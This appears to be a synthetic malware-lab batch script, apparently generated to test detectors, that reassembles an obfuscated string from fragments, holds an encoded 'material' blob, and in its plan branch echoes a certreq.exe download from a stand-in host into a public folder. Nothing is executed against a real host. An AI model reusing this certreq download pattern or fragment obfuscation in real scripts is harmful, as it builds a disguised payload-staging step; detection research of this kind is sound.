@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|rotate_left
rem HUNTRESS-MATERIAL:oLMycJmYupMzm5mYuBnWK7swobOuELMmmbuykjO3qDJuGLN2ErOo4aO5Kbuq4Snh6BN6CDuvKjt0MjP6CjMXGjGYshsZmBmXILN2CzO3SzlyYDu2CDvycJmYupMzm5mYuBnXeRn5gjO6QrH2krO+iJmbKzsZuJmbwpF3OLtwgrtwGrHyS7L3OLtwgrtwGjvyc7N36pszCruzcLM2+iO8KzN+yTO6KTuvWbswEjN2CzseQDuwk7M+ipH6cru3G7ryOLM6mjvywrMXirM5oTuyGrH5KjO4Cjsw4rM2SzsvKju0k7OWKju3arM5+qM5Sru4GLsemDuyobO+ipH7
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set FrAg0=v=1^|steps=acquire_remote,write_file^|adapter=certreq.exe^|stage_c
set FrAg1=ount=1^|graph=fallback_retry^|next_language=none^|campaign_id=camp
set FrAg2=aign-87173fe711^|url=https://87173fe711.example.invalid/033d604c
set FrAg3=.dat^|file_path=C:\Users\Public\HuntressLab\stage-87173fe711.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=268d6624"
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
call set "ReCoVeReD=%%FrAg0%%%%FrAg1%%%%FrAg2%%%%FrAg3%%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo certreq.exe acquire https://87173fe711.example.invalid/033d604c.dat to C:\Users\Public\HuntressLab\stage-87173fe711.dat
exit /b 0
